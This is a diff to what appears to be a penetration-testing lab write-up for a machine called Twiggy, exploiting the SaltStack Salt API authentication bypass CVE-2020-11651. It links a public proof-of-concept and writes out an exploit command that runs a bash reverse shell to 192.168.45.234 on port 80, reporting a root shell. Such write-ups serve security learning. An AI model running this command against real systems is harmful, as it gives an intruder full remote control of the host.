@@ -1,4 +1,20 @@
-## Initial Recon
+# Report-Twiggy
+
+Vulnerability Exploited:
+SaltStack Salt API – Authentication Bypass & Remote Code Execution (CVE-2020-11651)
+
+System Vulnerable:
+192.168.132.62
+
+Vulnerability Explanation:
+The Salt API service exposed on TCP port 8000 is vulnerable to an authentication bypass vulnerability (CVE-2020-11651).
+This vulnerability allows an unauthenticated attacker to execute arbitrary commands on the Salt master
+
+Severity:
+Critical
+
+
+## Information	Gathering:
 
 Full Nmap scan of all ports:
 
@@ -46,7 +62,7 @@ Searching Exploit-DB for PoC on salt-api's vulnerability:
 
 Proof of concept Code:https://github.com/jasperla/CVE-2020-11651-poc
 
-Confirming RCE:
+### Confirming RCE:
 
 Env:
 ```
@@ -61,10 +77,14 @@ pip3 install salt pyyaml looseversion packaging tornado msgpack distro jinja2 zm
 
 RCE Command:
 ```
-python3 exploit.py --master 192.168.132.62 --exec "bash -i >& /dev/tcp/192.168.45.234/80 0>&1"
+python3 exploit.py --master $ip --exec "bash -i >& /dev/tcp/192.168.45.234/80 0>&1"
 ```
 <img width="1176" height="245" alt="Pasted image 20260119115356" src="https://github.com/user-attachments/assets/91a3b429-f582-44ca-aab3-f6992f435503" />
 
 Listener on attacking machine:
 
 <img width="621" height="347" alt="Pasted image 20260119115417" src="https://github.com/user-attachments/assets/7596e3a6-78e9-4b82-a812-9d5f07048813" />
+
+The reverse shell was obtained as the root user.
+
+Successful command execution confirmed that the target is vulnerable to CVE-2020-11651.
